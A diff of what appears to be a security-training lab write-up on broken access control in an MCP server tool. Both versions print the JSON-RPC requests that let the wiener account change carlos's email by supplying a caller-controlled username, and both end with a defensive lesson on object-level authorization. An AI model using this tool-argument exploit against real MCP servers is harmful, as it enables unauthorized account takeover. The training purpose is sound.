@@ -6,68 +6,40 @@ permalink: /labs/broken-access-control-in-mcp-tool/
 
 # Broken Access Control in an MCP Server Tool
 
-## Lab
+## Goal
 
-**Name:** Broken access control in an MCP server tool
-**Goal:** Use an MCP tool to change the email address of `carlos`.
+Use the ordinary `wiener` account to change `carlos`'s email through `update_email`.
 
-## Authentication
+## Walkthrough
 
-Log in as `wiener` and copy the API key shown on `/my-account`.
+1. Sign in to the assigned lab as `wiener` and open `/my-account`. Copy the API key shown there; use it only in requests to this lab.
+2. In Burp Repeater, initialize the MCP connection with that key as a bearer token. Keep any session header returned by initialization on subsequent requests.
+3. Send `tools/list`. Find `update_email` and inspect its input schema. The schema includes both `email` and an optional `username`, which is the important clue: the caller may be able to select the account being changed.
 
-Use the API key as a bearer token:
+   ```json
+   {"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
+   ```
 
-```http
-Authorization: Bearer <Wiener API key>
-Content-Type: application/json
-```
+4. Send a `tools/call` request naming `update_email`. Set `username` to `carlos` and supply a valid email address:
 
-## Identify the Vulnerable Tool
+   ```json
+   {
+     "jsonrpc":"2.0",
+     "id":3,
+     "method":"tools/call",
+     "params":{
+       "name":"update_email",
+       "arguments":{"username":"carlos","email":"attacker@example.com"}
+     }
+   }
+   ```
 
-Initialize the MCP server and list its tools:
+5. Check the tool result. `Email updated for carlos` means the request was accepted even though the bearer token belongs to `wiener`; the lab should now be solved.
 
-```json
-{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
-```
+## Why it works
 
-The `update_email` tool accepts an optional `username` argument:
+The API key authenticates `wiener`, but the tool trusts a caller-controlled username when selecting the account to modify. The server does not check that the authenticated principal owns or is authorized to update `carlos`.
 
-```json
-{
-  "username": "wiener",
-  "email": "attacker@example.com"
-}
-```
+## Defensive lesson
 
-## Exploit
-
-Call `update_email` with `carlos` as the target username:
-
-```json
-{
-  "jsonrpc":"2.0",
-  "id":3,
-  "method":"tools/call",
-  "params": {
-    "name": "update_email",
-    "arguments": {
-      "username": "carlos",
-      "email": "attacker@example.com"
-    }
-  }
-}
-```
-
-A successful response is:
-
-```text
-Email updated for carlos
-```
-
-## Why It Works
-
-The tool does not verify that the authenticated API-key owner is allowed to modify the requested account. The `username` argument makes it possible to act on another user's account.
-
-## Key Takeaway
-
-Authorization checks must be applied at the tool and account-object level. Authentication alone does not prove that a user may modify a target account.
+Derive the target account from the authenticated identity when possible. If a tool accepts an account identifier, authorize that exact object on the server before performing the update.
